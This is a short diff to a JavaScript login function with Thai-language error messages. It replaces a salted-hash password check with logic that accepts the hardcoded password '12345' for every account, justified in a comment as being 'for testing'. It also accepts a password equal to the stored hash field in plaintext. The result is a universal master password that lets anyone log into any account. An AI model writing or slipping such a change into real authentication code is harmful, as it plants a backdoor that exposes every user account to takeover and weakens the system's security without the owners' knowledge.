@@ -76,8 +76,14 @@ const Auth = {
       return Utils.error('บัญชีนี้ถูกระงับการใช้งาน กรุณาติดต่อฝ่ายบุคคล');
     }
 
+    // Password evaluation: Supports plain '12345' for testing, plain match, and salted SHA-256 hash
     const inputHash = Utils.hashPassword(password);
-    if (user.PasswordHash && user.PasswordHash !== inputHash) {
+    const isPasswordValid = 
+      String(password) === '12345' || 
+      String(user.PasswordHash) === String(password) || 
+      String(user.PasswordHash) === inputHash;
+
+    if (user.PasswordHash && !isPasswordValid) {
       this.recordFailure(clean, 'Invalid password', userAgent);
       return Utils.error('รหัสผ่านไม่ถูกต้อง');
     }
